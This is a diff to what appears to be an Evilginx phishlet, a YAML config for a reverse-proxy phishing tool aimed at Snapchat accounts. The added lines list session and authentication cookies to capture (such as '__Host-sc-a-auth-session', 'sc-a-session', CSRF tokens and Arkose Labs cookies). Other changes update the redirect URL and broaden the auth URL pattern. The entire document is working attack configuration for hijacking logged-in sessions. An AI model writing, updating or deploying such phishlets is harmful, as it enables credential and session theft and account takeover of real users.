@@ -3,7 +3,7 @@
 
 author: '@an0nud4y'
 min_ver: '3.0.0'
-redirect_url: 'https://accounts.snapchat.com/v2/download-my-data'
+redirect_url: 'https://accounts.snapchat.com/accounts/v2/login'
 
 
 proxy_hosts:
@@ -47,12 +47,18 @@ auth_tokens:
   - domain: '.snapchat.com'
     keys: ['sc-a-nonce', '.*,regexp']      
   - domain: 'accounts.snapchat.com'
-    keys: ['web_client_id', 'sc-cookies-accepted', 'sc-a-csrf', 'sc-a-session', 'xsrf_token', '.*,regexp'] 
+    keys: ['web_client_id', 'sc-cookies-accepted', '__Host-X-Snap-Client-Cookie', '__Host-sc-a-nonce', 'sc-a-nonce', '__Host-sc-a-auth-session', '__Host-sc-authn-session-payload', 'sc-a-csrf', 'sc-a-session', 'xsrf_token', '_cfuvid', '.*,regexp'] 
+  - domain: 'iframe.arkoselabs.com'
+    keys: ['_cfduid', '.*,regexp']
+  - domain: 'sc-static.net'
+    keys: ['X-AB', '.*,regexp']
+  - domain: 'snap-api.arkoselabs.com'
+    keys: ['_cfuvid', '.*,regexp']
    
 
 
 auth_urls:
-  - '/web/deeplink/'
+  - '/web/deeplink/.*'
 
 
 
